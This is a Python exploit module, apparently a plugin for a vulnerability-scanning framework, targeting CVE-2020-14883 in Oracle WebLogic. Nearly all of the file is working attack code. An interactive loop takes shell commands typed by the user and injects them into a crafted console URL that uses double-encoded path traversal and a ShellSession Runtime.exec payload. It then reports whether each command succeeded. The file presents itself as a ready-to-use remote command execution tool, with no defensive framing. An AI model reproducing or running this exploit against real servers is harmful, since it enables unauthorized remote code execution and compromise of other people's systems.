import pocs
from function import get_ip
from lib import config
from lib import output
import re
import requests
import urllib3
from colorama import init
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=False) 

class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        # 根据漏洞的信息进行定义
        super().__init__()
        self.poc_name='weblgic 远程命令执行漏洞'
        self.vul_name='weblgic 远程命令执行漏洞'
        self.vul_num='CVE-2020-14883'
        self.app_name='weblgic'
        self.app_version='12.1.3 12.2.1 14.1.1'
        self.author='haochen'
        self.msg="可远程命令执行或写入文件"
        self.output = output.cmd_output()
        # 根据需要的参数进行定义，被攻击的url或ip必须定义为target
        self.must_parameter={
            'target' : ''
        }

    def exploit(self,must_parameter,cho_parameter):
        '''
            扫描使用的函数
        '''
        # 将攻击的目标和poc名称导入
        att_msg = {}
        url = must_parameter['target']
        self.must_parameter = must_parameter
        head = config.Pack
        while(True):
            command = input('请输入要执行的命令:')
            if command == 'exit':
                break
            self.payload="""/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27"""+command+"""%27);%22); HTTP/1.1"""
            if re.search('/$',url):
                url=url[0:len(url)-1]
            target = url + self.payload
            try:
                response = requests.get(target,headers=head)
                # 攻击完成后需要将攻击的结果写入
                if response.status_code == 200:
                    self.output.output_info('命令执行成功')
                else:
                    self.output.output_error('命令执行失败！')
            except:
                self.output.output_error('网站访问错误！')
        return att_msg